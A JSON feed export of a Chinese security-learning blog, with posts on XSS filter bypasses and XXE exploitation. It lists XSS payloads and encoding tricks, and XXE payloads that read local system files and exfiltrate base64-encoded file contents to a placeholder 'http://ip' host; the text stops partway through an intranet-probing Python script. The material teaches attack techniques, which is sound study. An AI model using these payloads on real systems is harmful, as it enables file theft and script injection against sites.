{
    "version": "https://jsonfeed.org/version/1",
    "title": "sxq",
    "subtitle": "一天找不到实习就写一天blog",
    "icon": "http://example.com/images/favicon.ico",
    "description": null,
    "home_page_url": "http://example.com",
    "items": [
        {
            "id": "http://example.com/2024/03/11/MySql%E6%80%BB%E7%BB%93/",
            "url": "http://example.com/2024/03/11/MySql%E6%80%BB%E7%BB%93/",
            "title": "MySql总结",
            "date_published": "2024-03-11T02:13:31.000Z",
            "content_html": "",
            "tags": []
        },
        {
            "id": "http://example.com/2024/03/11/XSS%E5%88%A9%E7%94%A8%E6%96%B9%E5%BC%8F/",
            "url": "http://example.com/2024/03/11/XSS%E5%88%A9%E7%94%A8%E6%96%B9%E5%BC%8F/",
            "title": "XSS利用方式",
            "date_published": "2024-03-11T02:12:59.000Z",
            "content_html": "<h1 id=\"xss的分类\"><a class=\"anchor\" href=\"#xss的分类\">#</a> XSS 的分类</h1>\n<p>反射型：经过后端，不经过数据库<br>\n存储型：经过后端，经过数据库</p>\n<p>DOM 型：不经过后端</p>\n<h1 id=\"利用方式\"><a class=\"anchor\" href=\"#利用方式\">#</a> 利用方式</h1>\n<h2 id=\"通用payload\"><a class=\"anchor\" href=\"#通用payload\">#</a> 通用 payload</h2>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;script&gt;<span class=\"title function_\">alert</span>(<span class=\"number\">1</span>)&lt;/script&gt;</span><br></pre></td></tr></table></figure>\n<h2 id=\"构造闭合\"><a class=\"anchor\" href=\"#构造闭合\">#</a> 构造闭合</h2>\n<p>有时遇到页面代码如下</p>\n<figure class=\"highlight html\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">input</span> <span class=\"attr\">name</span>=<span class=\"string\">keyword</span> <span class=\"attr\">value</span>=<span class=\"string\">&quot;test&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure>\n<p>所以 payload 还要兼顾左边的闭合</p>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"string\">&quot;&gt;&lt;script&gt;alert(1)&lt;/script&gt;</span></span><br></pre></td></tr></table></figure>\n<h2 id=\"被转义成lt-gt\"><a class=\"anchor\" href=\"#被转义成lt-gt\">#</a> &lt;、&gt; 被转义成 &amp; lt;、&amp;gt;</h2>\n<p>有时服务端采用 htmlspecialchars () 函数将一些字符转义成 HTML 实体。如下</p>\n<figure class=\"highlight html\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&amp; -&gt; <span class=\"symbol\">&amp;amp;</span></span><br><span class=\"line\">&quot; -&gt; <span class=\"symbol\">&amp;quot;</span></span><br><span class=\"line\">&#x27; -&gt; &amp;#039</span><br><span class=\"line\">&lt; -&gt; <span class=\"symbol\">&amp;lt;</span></span><br><span class=\"line\">&gt;  -&gt; <span class=\"symbol\">&amp;gt;</span></span><br></pre></td></tr></table></figure>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;input value=<span class=\"string\">&#x27;test&#x27;</span>&gt;</span><br></pre></td></tr></table></figure>\n<p>如果不能用 &lt;&gt;，可以利用的 payload 如下 (注意闭合)</p>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"string\">&#x27; onmouseover = &#x27;</span><span class=\"attr\">javascript</span>:<span class=\"title function_\">alert</span>(<span class=\"number\">1</span>)<span class=\"string\">&#x27;</span></span><br></pre></td></tr></table></figure>\n<h2 id=\"script被替换成scr_ipt-onmouseover被替换成o_nmouseover\"><a class=\"anchor\" href=\"#script被替换成scr_ipt-onmouseover被替换成o_nmouseover\">#</a> script 被替换成 scr_ipt、onmouseover 被替换成 o_nmouseover</h2>\n<p>1、大小写</p>\n<p>2、空格绕过，如果过滤的是整个 &lt;script&gt;，可以这样绕过：&lt;script &gt;(空格只能加在尾部)</p>\n<p>3、超链接，payload 如下</p>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">test<span class=\"string\">&quot;&gt;&lt;a href=&quot;</span><span class=\"attr\">javascript</span>:<span class=\"title function_\">alert</span>(<span class=\"number\">1</span>)</span><br></pre></td></tr></table></figure>\n<h2 id=\"双写绕过\"><a class=\"anchor\" href=\"#双写绕过\">#</a> 双写绕过</h2>\n<p>服务端的部分源码如下</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"variable\">$str</span> =<span class=\"title function_ invoke__\">strtolower</span>( <span class=\"variable\">$_GET</span>[<span class=\"string\">&quot;keyword&quot;</span>]);</span><br><span class=\"line\"><span class=\"variable\">$str2</span>=<span class=\"title function_ invoke__\">str_replace</span>(<span class=\"string\">&quot;script&quot;</span>,<span class=\"string\">&quot;&quot;</span>,<span class=\"variable\">$str</span>);</span><br><span class=\"line\"><span class=\"variable\">$str3</span>=<span class=\"title function_ invoke__\">str_replace</span>(<span class=\"string\">&quot;on&quot;</span>,<span class=\"string\">&quot;&quot;</span>,<span class=\"variable\">$str2</span>);</span><br><span class=\"line\"><span class=\"variable\">$str4</span>=<span class=\"title function_ invoke__\">str_replace</span>(<span class=\"string\">&quot;src&quot;</span>,<span class=\"string\">&quot;&quot;</span>,<span class=\"variable\">$str3</span>);</span><br><span class=\"line\"><span class=\"variable\">$str5</span>=<span class=\"title function_ invoke__\">str_replace</span>(<span class=\"string\">&quot;data&quot;</span>,<span class=\"string\">&quot;&quot;</span>,<span class=\"variable\">$str4</span>);</span><br><span class=\"line\"><span class=\"variable\">$str6</span>=<span class=\"title function_ invoke__\">str_replace</span>(<span class=\"string\">&quot;href&quot;</span>,<span class=\"string\">&quot;&quot;</span>,<span class=\"variable\">$str5</span>);</span><br></pre></td></tr></table></figure>\n<p>无法采用大小写绕过，并把关键词都替换成了空，</p>\n<p>然而 str_replace 只能替换一次，这样就可以采用双写绕过了</p>\n<p>payload</p>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">test<span class=\"string\">&quot; oonnmouseover=&quot;</span><span class=\"attr\">javascript</span>:<span class=\"title function_\">alert</span>(<span class=\"number\">1</span>)</span><br></pre></td></tr></table></figure>\n<h2 id=\"html编码绕过过滤\"><a class=\"anchor\" href=\"#html编码绕过过滤\">#</a> html 编码绕过过滤</h2>\n<p>如果源码如下，我们就不能采用双写绕过了</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"variable\">$str</span> = <span class=\"title function_ invoke__\">strtolower</span>(<span class=\"variable\">$_GET</span>[<span class=\"string\">&quot;keyword&quot;</span>]);</span><br><span class=\"line\"><span class=\"variable\">$str2</span>=<span class=\"title function_ invoke__\">str_replace</span>(<span class=\"string\">&quot;script&quot;</span>,<span class=\"string\">&quot;scr_ipt&quot;</span>,<span class=\"variable\">$str</span>);</span><br><span class=\"line\"><span class=\"variable\">$str3</span>=<span class=\"title function_ invoke__\">str_replace</span>(<span class=\"string\">&quot;on&quot;</span>,<span class=\"string\">&quot;o_n&quot;</span>,<span class=\"variable\">$str2</span>);</span><br><span class=\"line\"><span class=\"variable\">$str4</span>=<span class=\"title function_ invoke__\">str_replace</span>(<span class=\"string\">&quot;src&quot;</span>,<span class=\"string\">&quot;sr_c&quot;</span>,<span class=\"variable\">$str3</span>);</span><br><span class=\"line\"><span class=\"variable\">$str5</span>=<span class=\"title function_ invoke__\">str_replace</span>(<span class=\"string\">&quot;data&quot;</span>,<span class=\"string\">&quot;da_ta&quot;</span>,<span class=\"variable\">$str4</span>);</span><br><span class=\"line\"><span class=\"variable\">$str6</span>=<span class=\"title function_ invoke__\">str_replace</span>(<span class=\"string\">&quot;href&quot;</span>,<span class=\"string\">&quot;hr_ef&quot;</span>,<span class=\"variable\">$str5</span>);</span><br><span class=\"line\"><span class=\"variable\">$str7</span>=<span class=\"title function_ invoke__\">str_replace</span>(<span class=\"string\">&#x27;&quot;&#x27;</span>,<span class=\"string\">&#x27;&amp;quot&#x27;</span>,<span class=\"variable\">$str6</span>);</span><br></pre></td></tr></table></figure>\n<p>这是要利用 html 编码绕过，即把 payload 转化成 html 编码</p>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"attr\">javascript</span>:<span class=\"title function_\">alert</span>(<span class=\"number\">1</span>)  -&gt;</span><br><span class=\"line\">&amp;#x6a;&amp;#x61;&amp;#x76;&amp;#x61;&amp;#x73;&amp;#x63;&amp;#x72;&amp;#x69;&amp;#x70;&amp;#x74;&amp;#x3a;&amp;#x61;&amp;#x6c;&amp;#x65;&amp;#x72;&amp;#x74;&amp;#x28;&amp;#x31;&amp;#x29;</span><br></pre></td></tr></table></figure>\n<h2 id=\"巧用注释符\"><a class=\"anchor\" href=\"#巧用注释符\">#</a> 巧用注释符</h2>\n<p>如果服务端检测输入的内容要包含特定字符串，比如 HTTP://，可以在用注释符注释</p>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;a href=<span class=\"string\">&quot;javascript:alert(1) //http:// </span></span><br></pre></td></tr></table></figure>\n",
            "tags": []
        },
        {
            "id": "http://example.com/2024/03/10/XXE%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93%E4%B8%8E%E5%88%A9%E7%94%A8/",
            "url": "http://example.com/2024/03/10/XXE%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93%E4%B8%8E%E5%88%A9%E7%94%A8/",
            "title": "XXE漏洞总结与利用",
            "date_published": "2024-03-10T01:29:50.000Z",
            "content_html": "<h1 id=\"xxe是什么\"><a class=\"anchor\" href=\"#xxe是什么\">#</a> XXE 是什么</h1>\n<p>XXE 全称 XML 外部实体注入 (XML External Entity Injection)。既然是注入漏洞，那么利用逻辑和所有其他注入漏洞利用的逻辑是一样的，一个简单的例子如下图</p>\n<p><img data-src=\"XXE%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93%E4%B8%8E%E5%88%A9%E7%94%A8%5C1.png\" alt=\"1\"></p>\n<h1 id=\"xml基础知识\"><a class=\"anchor\" href=\"#xml基础知识\">#</a> XML 基础知识</h1>\n<p>XML 文档有自己的格式规范 DTD (document type definition)</p>\n<p>举个例子，如果一个 XML 文档的 DTD 长这样子</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;?xml version=&quot;1.0&quot;?&gt;\t\t\t\t\t\t\t\t//XML 文档定义</span><br><span class=\"line\">&lt;!DOCTYPE message [\t\t\t\t\t\t\t\t\t//根元素message</span><br><span class=\"line\">&lt;!ELEMENT message (receiver ,sender ,header ,msg)&gt;\t//根元素message的4个子元素</span><br><span class=\"line\">&lt;!ELEMENT receiver (#PCDATA)&gt;\t\t\t\t\t\t//子元素及类型</span><br><span class=\"line\">&lt;!ELEMENT sender (#PCDATA)&gt;</span><br><span class=\"line\">&lt;!ELEMENT header (#PCDATA)&gt;</span><br><span class=\"line\">&lt;!ELEMENT msg (#PCDATA)&gt;</span><br></pre></td></tr></table></figure>\n<p>则 XML 文档需要这么写</p>\n<figure class=\"highlight xml\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">message</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">receiver</span>&gt;</span>Myself<span class=\"tag\">&lt;/<span class=\"name\">receiver</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">sender</span>&gt;</span>Someone<span class=\"tag\">&lt;/<span class=\"name\">sender</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">header</span>&gt;</span>TheReminder<span class=\"tag\">&lt;/<span class=\"name\">header</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">msg</span>&gt;</span>This is an amazing book<span class=\"tag\">&lt;/<span class=\"name\">msg</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">message</span>&gt;</span></span><br></pre></td></tr></table></figure>\n<p>上面的例子定义了元素，再来看一个定义实体的例子</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">//dtd</span><br><span class=\"line\">&lt;?xml version=&quot;1.0&quot; encoding=&quot;ISO-8859-1&quot;?&gt;</span><br><span class=\"line\">&lt;!DOCTYPE foo [</span><br><span class=\"line\">&lt;!ELEMENT foo ANY &gt;</span><br><span class=\"line\">&lt;!ENTITY xxe &quot;test&quot; &gt;]&gt;</span><br></pre></td></tr></table></figure>\n<p>xxe 作为实体，可以用 &amp; 引用，则 &amp; xxe 会被替换成 test</p>\n<h1 id=\"实体的分类\"><a class=\"anchor\" href=\"#实体的分类\">#</a> 实体的分类</h1>\n<h2 id=\"内部实体和外部实体\"><a class=\"anchor\" href=\"#内部实体和外部实体\">#</a> 内部实体和外部实体</h2>\n<p>两者很好区分</p>\n<p>内部实体在 DTD 内声明的实体，例如</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;?xml version = &quot;1.0&quot; encoding = &quot;UTF-8&quot; standalone = &quot;yes&quot;?&gt;</span><br><span class=\"line\"></span><br><span class=\"line\">&lt;!DOCTYPE address [</span><br><span class=\"line\">   &lt;!ELEMENT address (#PCDATA)&gt;</span><br><span class=\"line\">   &lt;!ENTITY name &quot;Max su&quot;&gt;</span><br><span class=\"line\">   &lt;!ENTITY company &quot;Yiibai&quot;&gt;</span><br><span class=\"line\">   &lt;!ENTITY phone_no &quot;(086) 123-4567890&quot;&gt;</span><br><span class=\"line\">]&gt;</span><br><span class=\"line\">//上文声明了3个实体</span><br><span class=\"line\">&lt;address&gt;</span><br><span class=\"line\">   &amp;name;</span><br><span class=\"line\">   &amp;company;</span><br><span class=\"line\">   &amp;phone_no;</span><br><span class=\"line\">&lt;/address&gt;</span><br><span class=\"line\">//引用</span><br></pre></td></tr></table></figure>\n<p>外部实体在 DTD 之外声明的实体</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;?xml version = &quot;1.0&quot; encoding = &quot;UTF-8&quot; standalone = &quot;yes&quot;?&gt;</span><br><span class=\"line\">&lt;!DOCTYPE a SYSTEM &quot;xxx.dtd&quot;&gt; //其中xxx.dtd是一个外部文件，a是xxx.dtd中定义的实体</span><br><span class=\"line\"></span><br><span class=\"line\">//下面就可以引用xxx.dtd中定义的a了</span><br></pre></td></tr></table></figure>\n<h2 id=\"通用实体和参数实体\"><a class=\"anchor\" href=\"#通用实体和参数实体\">#</a> 通用实体和参数实体</h2>\n<p><strong>通用实体</strong> (常规实体)</p>\n<p>用 &amp; 实体名；引用的实体，需要先在 DTD 中声明再使用</p>\n<p>例如</p>\n<figure class=\"highlight xml\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?xml version=<span class=\"string\">&quot;1.0&quot;</span> encoding=<span class=\"string\">&quot;utf-8&quot;</span>?&gt;</span> </span><br><span class=\"line\"><span class=\"meta\">&lt;!DOCTYPE <span class=\"keyword\">updateProfile</span> [<span class=\"meta\">&lt;!ENTITY <span class=\"keyword\">file</span> <span class=\"keyword\">SYSTEM</span> <span class=\"string\">&quot;file:///c:/windows/win.ini&quot;</span>&gt;</span> ]&gt;</span> </span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">updateProfile</span>&gt;</span>  </span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">firstname</span>&gt;</span>Joe<span class=\"tag\">&lt;/<span class=\"name\">firstname</span>&gt;</span>  </span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">lastname</span>&gt;</span><span class=\"symbol\">&amp;file;</span><span class=\"tag\">&lt;/<span class=\"name\">lastname</span>&gt;</span>  </span><br><span class=\"line\">    ... </span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">updateProfile</span>&gt;</span></span><br></pre></td></tr></table></figure>\n<p><strong>参数实体</strong></p>\n<p>用 % 实体名；引用的实体，其定义和使用都以 % 开头</p>\n<p>例如下面引用的内部参数实体</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;!ENTITY % an-element &quot;&lt;!ELEMENT mytag (subtag)&gt;&quot;&gt; </span><br><span class=\"line\">&lt;!ENTITY % remote-dtd SYSTEM &quot;http://somewhere.example.org/remote.dtd&quot;&gt; </span><br><span class=\"line\">%an-element; %remote-dtd;</span><br></pre></td></tr></table></figure>\n<h1 id=\"xxe漏洞利用\"><a class=\"anchor\" href=\"#xxe漏洞利用\">#</a> XXE 漏洞利用</h1>\n<h2 id=\"有回显读本地敏感文件\"><a class=\"anchor\" href=\"#有回显读本地敏感文件\">#</a> 有回显读本地敏感文件</h2>\n<p>服务器上存在解析 XML 的 php 代码 test.php</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\">    <span class=\"title function_ invoke__\">libxml_disable_entity_loader</span> (<span class=\"literal\">false</span>); <span class=\"comment\">//允许解析xml实体</span></span><br><span class=\"line\">    <span class=\"variable\">$xmlfile</span> = <span class=\"title function_ invoke__\">file_get_contents</span>(<span class=\"string\">&#x27;php://input&#x27;</span>);</span><br><span class=\"line\">    <span class=\"variable\">$dom</span> = <span class=\"keyword\">new</span> <span class=\"title class_\">DOMDocument</span>();</span><br><span class=\"line\">    <span class=\"variable\">$dom</span>-&gt;<span class=\"title function_ invoke__\">loadXML</span>(<span class=\"variable\">$xmlfile</span>, LIBXML_NOENT | LIBXML_DTDLOAD); </span><br><span class=\"line\">    <span class=\"variable\">$a</span> = <span class=\"title function_ invoke__\">simplexml_import_dom</span>(<span class=\"variable\">$dom</span>);</span><br><span class=\"line\">    <span class=\"keyword\">echo</span> <span class=\"variable\">$a</span>;</span><br><span class=\"line\"><span class=\"meta\">?&gt;</span></span><br></pre></td></tr></table></figure>\n<p>payload</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt; </span><br><span class=\"line\">&lt;!DOCTYPE b [  </span><br><span class=\"line\">&lt;!ENTITY c SYSTEM &quot;file:///c:/windows/system.ini&quot;&gt; ]&gt; </span><br><span class=\"line\">&lt;b&gt;&amp;c;&lt;/b&gt;</span><br></pre></td></tr></table></figure>\n<p>结果</p>\n<p><img data-src=\"XXE%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93%E4%B8%8E%E5%88%A9%E7%94%A8%5CSnipaste_2024-03-10_10-50-15.png\" alt=\"Snipaste_2024-03-10_10-50-15\"></p>\n<p>此 payload 的局限性：如果要读取的文件含特殊符号，则会报错</p>\n<p>解决手段：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;![CDATA[&quot;要读取的内容&quot;]]&gt;</span><br></pre></td></tr></table></figure>\n<p>原理：CDATA 会将里面的内容当做原始格式处理</p>\n<p>所以自然能想到把 payload 改成这样</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt; </span><br><span class=\"line\">&lt;!DOCTYPE b [  </span><br><span class=\"line\">&lt;!ENTITY start &quot;&lt;![CDATA[&quot;&gt;</span><br><span class=\"line\">&lt;!ENTITY c SYSTEM &quot;file:///c:/windows/system.ini&quot;&gt; </span><br><span class=\"line\">&lt;!ENTITY END &quot;]]&gt;&quot;&gt;</span><br><span class=\"line\">\t\t\t]</span><br><span class=\"line\">&gt; </span><br><span class=\"line\">&lt;b&gt;&amp;start;&amp;c;&amp;end;&lt;/b&gt;</span><br></pre></td></tr></table></figure>\n<p>但是这样是不行的，因为 xml 中不能拼接，只能先拼接再调用。所以只能用参数实体解决</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt; </span><br><span class=\"line\">&lt;!DOCTYPE b [</span><br><span class=\"line\">&lt;!ENTITY % start &quot;&lt;![CDATA[&quot;&gt;   </span><br><span class=\"line\">&lt;!ENTITY % c SYSTEM &quot;file:///d:/test.txt&quot;&gt;  </span><br><span class=\"line\">&lt;!ENTITY % end &quot;]]&gt;&quot;&gt;  </span><br><span class=\"line\">&lt;!ENTITY % dtd SYSTEM &quot;http://ip/evil.dtd&quot;&gt; </span><br><span class=\"line\">%dtd; ]&gt; </span><br><span class=\"line\"></span><br><span class=\"line\">&lt;b&gt;&amp;all;&lt;/b&gt;</span><br></pre></td></tr></table></figure>\n<p>其中 evil.dtd</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt; </span><br><span class=\"line\">&lt;!ENTITY all &quot;%start;%c;%end;&quot;&gt;</span><br></pre></td></tr></table></figure>\n<h2 id=\"无回显读本地敏感文件\"><a class=\"anchor\" href=\"#无回显读本地敏感文件\">#</a> 无回显读本地敏感文件</h2>\n<p>一般来说无回显的情况较多，利用方式也稍微复杂一点</p>\n<p>服务端存在 test.php 解析 xml 文本</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\">    <span class=\"title function_ invoke__\">libxml_disable_entity_loader</span> (<span class=\"literal\">false</span>);</span><br><span class=\"line\">    <span class=\"variable\">$xmlfile</span> = <span class=\"title function_ invoke__\">file_get_contents</span>(<span class=\"string\">&#x27;php://input&#x27;</span>);</span><br><span class=\"line\">    <span class=\"variable\">$dom</span> = <span class=\"keyword\">new</span> <span class=\"title class_\">DOMDocument</span>();</span><br><span class=\"line\">    <span class=\"variable\">$dom</span>-&gt;<span class=\"title function_ invoke__\">loadXML</span>(<span class=\"variable\">$xmlfile</span>, LIBXML_NOENT | LIBXML_DTDLOAD); </span><br><span class=\"line\"><span class=\"meta\">?&gt;</span></span><br></pre></td></tr></table></figure>\n<p>test.dtd</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;!ENTITY % file SYSTEM &quot;php://filter/read=convert.base64-encode/resource=file:///D:/test.txt&quot;&gt;</span><br><span class=\"line\">&lt;!ENTITY % int &quot;&lt;!ENTITY &amp;#37; send SYSTEM &#x27;http://ip:9999?p=%file;&#x27;&gt;&quot;&gt;</span><br></pre></td></tr></table></figure>\n<p>payload</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;!DOCTYPE convert [ </span><br><span class=\"line\">&lt;!ENTITY % remote SYSTEM &quot;http://ip/test.dtd&quot;&gt;</span><br><span class=\"line\">%remote;%int;%send;</span><br><span class=\"line\">]&gt;</span><br></pre></td></tr></table></figure>\n<h2 id=\"内网主机探测\"><a class=\"anchor\" href=\"#内网主机探测\">#</a> 内网主机探测</h2>\n<p>脚本</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> requests</span><br><span class=\"line\"><span class=\"keyword\">import</span> base64</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">#Origtional XML that the server accepts</span></span><br><span class=\"line\"><span class=\"comment\">#&lt;xml&gt;</span></span><br><span class=\"line\"><span class=\"comment\">#    &lt;stuff&gt;user&lt;/stuff&gt;</span></span><br><span class=\"line\"><span class=\"comment\">#&lt;/xml&gt;</span></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">build_xml</span>(<span class=\"params\">string</span>):</span><br><span class=\"line\">    xml = <span class=\"string\">&quot;&quot;&quot;&lt;?xml version=&quot;1.0&quot; encoding=&quot;ISO-8859-1&quot;?&gt;&quot;&quot;&quot;</span></span><br><span class=\"line\">    xml = xml + <span class=\"string\">&quot;\\r\\n&quot;</span> + <span class=\"string\">&quot;&quot;&quot;&lt;!DOCTYPE foo [ &lt;!ELEMENT foo ANY &gt;&quot;&quot;&quot;</span></span><br><span class=\"line\">    xml = xml + <span class=\"string\">&quot;\\r\\n&quot;</span> + <span class=\"string\">&quot;&quot;&quot;&lt;!ENTITY xxe SYSTEM 